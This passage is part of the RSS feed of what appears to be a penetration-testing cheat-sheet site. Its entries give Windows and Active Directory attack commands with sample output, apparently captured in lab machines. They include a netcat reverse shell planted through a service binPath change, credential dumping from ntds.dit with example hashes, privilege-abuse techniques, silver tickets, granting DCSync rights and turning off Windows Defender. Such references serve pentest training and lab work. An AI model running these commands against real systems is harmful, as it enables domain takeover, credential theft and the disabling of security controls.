      <description>Create credential object Method #1 Method #2 $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential($username, $password) $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Runas (with cred object) Invoke-Command PSSession Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp # Invoke command with config Invoke-Command -ScriptBlock { C:\ProgramData\rev.</description>
    </item>
    <item>
      <title>Scheduled tasks</title>
      <link>https://tldrbins.github.io/scheduled_tasks_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/scheduled_tasks_windows/</guid>
      <description>Check scheduled tasks Windows schtasks /query *Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; schtasks /query Folder: \ TaskName Next Run Time Status ======================================== ====================== =============== CleanUpDownloads N/A Ready CreateExplorerShellUnelevatedTask N/A Ready fix_vm N/A Ready OneDriveUpdate N/A Running User_Feed_Synchronization-{0041D634-0AC8 9/25/2024 12:48:00 AM Ready User_Feed_Synchronization-{12517E1A-613E 9/24/2024 6:58:48 PM Ready ...[SNIP]... # List details schtasks /TN \&amp;lt;FOLDER&amp;gt;\&amp;lt;TASKNAME&amp;gt; /FO LIST /V *Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; schtasks /TN \OneDriveUpdate /FO LIST /V Folder: \ HostName: DC TaskName: \OneDriveUpdate Next Run Time: N/A Status: Running Logon Mode: Interactive only Last Run Time: 9/24/2024 6:12:00 PM Last Result: 267009 Author: HOSPITAL\Administrator Task To Run: powershell.</description>
    </item>
    <item>
      <title>SeBackupPrivilege/SeRestorePrivilege</title>
      <link>https://tldrbins.github.io/sebackupprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Using helper dlls import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;TARGET_FILE_PATH&amp;gt; C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll&#xA;Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
    </item>
    <item>
      <title>secretsdump</title>
      <link>https://tldrbins.github.io/secretsdump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secretsdump/</guid>
      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL $ impacket-secretsdump -ntds ntds.dit -system system LOCAL Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: .</description>
    </item>
    <item>
      <title>Secure String</title>
      <link>https://tldrbins.github.io/secure_string/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secure_string/</guid>
      <description>Decrypt secure string Windows $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
    </item>
    <item>
      <title>SeDebugPrivilege</title>
      <link>https://tldrbins.github.io/sedebugprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: psgetsys</description>
    </item>
    <item>
      <title>SeImpresonate</title>
      <link>https://tldrbins.github.io/seimpresonate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seimpresonate/</guid>
      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
    </item>
    <item>
      <title>SeLoadDriverPrivilege</title>
      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
    </item>
    <item>
      <title>Server Operators</title>
      <link>https://tldrbins.github.io/server_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/server_operators/</guid>
      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe config VSS binpath=&amp;#34;C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443&amp;#34; [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started. # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.</description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://tldrbins.github.io/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/silver_ticket/</guid>
      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) [optional] sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 $ iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;REGGIE1234ronnie&amp;#39;) | openssl dgst -md4 MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ sudo ntpdate -s dc.</description>
    </item>
    <item>
      <title>SMB Enum</title>
      <link>https://tldrbins.github.io/smb_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_enum/</guid>
      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; $ sudo nmap --script=smb-enum-shares -p 445 10.10.11.207 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 04:53 GMT Nmap scan report for 10.10.11.207 Host is up (0.26s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ $ smbclient -N -L \\\\10.</description>
    </item>
    <item>
      <title>SMB Server</title>
      <link>https://tldrbins.github.io/smb_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_server/</guid>
      <description>Start a SMB Server for File Transfer Anonymous Authenticate Older Windows impacket-smbserver share . -smb2support $ impacket-smbserver share . -smb2support Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed impacket-smbserver share . -smb2support -username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-smbserver share . -smb2support -username &amp;#39;test&amp;#39; -password &amp;#39;test&amp;#39; Impacket v0.</description>
    </item>
    <item>
      <title>Volume Shadow Copies</title>
      <link>https://tldrbins.github.io/volume_shadow_copies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/volume_shadow_copies/</guid>
      <description>Abuse #1: Recover data from shadow copies Windows 1. Check vssadmin list shadows PS C:\Windows\system32&amp;gt; vssadmin list shadows vssadmin list shadows vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp. Contents of shadow copy set ID: {001689e5-f1a7-40a8-8b5b-8b6371bd07ca} Contained 1 shadow copies at creation time: 9/9/2019 3:10:57 AM Shadow Copy ID: {046396e4-6312-45b7-96cd-5e5f6fb017ef} Original Volume: (C:)\\?\Volume{21385651-0000-0000-0000-602200000000}\ Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 Originating Machine: dev.htb.local Service Machine: dev.htb.local Provider: &amp;#39;Microsoft Software Shadow Copy provider 1.</description>
    </item>
    <item>
      <title>Windows ACLs</title>
      <link>https://tldrbins.github.io/windows_acls/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_acls/</guid>
      <description>Window ACLs (Access Control Lists) Check ACLs powershell # Check a file/directory icacls &amp;lt;PATH&amp;gt; PS C:\xampp\htdocs\internal&amp;gt; icacls C:\xampp\htdocs\internal\applications icacls C:\xampp\htdocs\internal\applications C:\xampp\htdocs\internal\applications CREATOR OWNER:(OI)(CI)(IO)(F) OFFICE\PPotts:(OI)(CI)(NP)(F) NT AUTHORITY\SYSTEM:(OI)(CI)(F) NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F) OFFICE\web_account:(OI)(CI)(RX,W) BUILTIN\Administrators:(OI)(CI)(F) BUILTIN\Users:(OI)(CI)(RX) Successfully processed 1 files; Failed processing 0 files # Check all files and directories icacls * /C PS C:\xampp\htdocs\internal&amp;gt; icacls * /C icacls * /C applications CREATOR OWNER:(OI)(CI)(IO)(F) OFFICE\PPotts:(OI)(CI)(NP)(F) NT AUTHORITY\SYSTEM:(OI)(CI)(F) NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F) OFFICE\web_account:(OI)(CI)(RX,W) BUILTIN\Administrators:(OI)(CI)(F) BUILTIN\Users:(OI)(CI)(RX) css NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F) OFFICE\web_account:(I)(OI)(CI)(RX) NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F) BUILTIN\Administrators:(I)(OI)(CI)(F) BUILTIN\Users:(I)(OI)(CI)(RX) CREATOR OWNER:(I)(OI)(CI)(IO)(F) img NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F) OFFICE\web_account:(I)(OI)(CI)(RX) NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F) BUILTIN\Administrators:(I)(OI)(CI)(F) BUILTIN\Users:(I)(OI)(CI)(RX) CREATOR OWNER:(I)(OI)(CI)(IO)(F) index.</description>
    </item>
    <item>
      <title>Windows Defender</title>
      <link>https://tldrbins.github.io/windows_defender/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_defender/</guid>
      <description>Disable defender Powershell # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
    </item>
    <item>
      <title>Windows Event Logs</title>
      <link>https://tldrbins.github.io/windows_event_logs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_event_logs/</guid>
      <description>Convert evtx to json evtx_dump ./evtx_dump -o jsonl -t 1 -f Security.json Security.evtx Ref: evtx_dump&#xA;Check number of logs wc -l Security.json Security Check computer name cat Security.json | jq &amp;#39;.Event.System.Computer&amp;#39; -r | sort | uniq -c | sort -nr Overview of event logs cat Security.json | jq &amp;#39;.Event.System.EventID&amp;#39; | sort | uniq -c | sort -nr Check specific event cat Security.json | jq &amp;#39;select(.Event.System.EventID==4624)&amp;#39; </description>
    </item>
    <item>
      <title>Windows RPC</title>
      <link>https://tldrbins.github.io/windows_rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_rpc/</guid>
      <description>Windows RPC impacket IOXIDResolver # Show mappings impacket-rpcmap &amp;#39;ncacn_ip_tcp:&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-rpcmap &amp;#39;ncacn_ip_tcp:10.10.10.213&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra ...[SNIP]... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 ...[SNIP]... # Get network interface without auth python3 IOXIDResolver.py -t &amp;lt;TARGET&amp;gt; $ python3 IOXIDResolver.py -t 10.10.10.213 [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Ref: IOXIDResolver</description>
    </item>
    <item>
      <title>Winrm from Windows VM</title>
      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
    </item>
    <item>
      <title>WriteDacl</title>
      <link>https://tldrbins.github.io/writedacl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writedacl/</guid>
      <description>Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; Add-DomainObjectAcl -PrincipalIdentity &amp;#39;svc-alfresco&amp;#39; -TargetIdentity &amp;#39;HTB.LOCAL\Domain Admins&amp;#39; -Rights DCSync -Credential $Cred 4. Secrets dump Linux impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump &amp;#39;svc-alfresco:s3rvice@10.</description>
    </item>
    <item>
      <title>WriteOwner/Own</title>
      <link>https://tldrbins.github.io/writeowner/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writeowner/</guid>
      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria&amp;gt; . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; -OwnerIdentity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; *Evil-WinRM* PS C:\Users\maria&amp;gt; Set-DomainObjectOwner -Identity &amp;#39;DOMAIN ADMINS&amp;#39; -OwnerIdentity &amp;#39;maria&amp;#39; Abuse #2 : Add user to the group Linux Windows 1. Add full control permission to the user over the group impacket bloodyAD&#xA;# Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install .</description>
    </item>
  </channel>
</rss>
